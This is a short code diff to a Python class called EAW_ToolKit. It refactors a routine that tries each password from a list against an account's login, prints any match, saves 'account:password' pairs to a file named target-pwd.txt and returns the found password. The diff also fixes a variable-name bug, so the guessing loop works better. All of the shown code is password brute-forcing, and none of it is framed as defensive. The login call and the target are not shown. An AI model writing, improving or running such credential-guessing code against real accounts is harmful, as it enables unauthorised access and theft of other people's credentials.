@@ -168,11 +168,13 @@ class EAW_ToolKit:
            begin = 0
            end = len(self.passwordList)+1
         else:
-            begin= beginIndex
+            begin= beginIdx
             end = endIdx
         targetPwdFile= open('target-pwd.txt', 'a')
         
-        for pwd in self.passwordList[begin:end]:
+        idx = begin
+        while idx < end:
+            pwd = self.passwordList[idx]
             password = str(pwd)
             response = self._login(account, password)
             try:
@@ -190,9 +192,9 @@ class EAW_ToolKit:
                 print ('Password found:'+ password)
                 targetPwdFile.write(account+':'+password)
                 targetPwdFile.write('\n')
-                return
-            
+                return password
+            idx += 1
         print ('No password found')
-
+        return ""
 
     
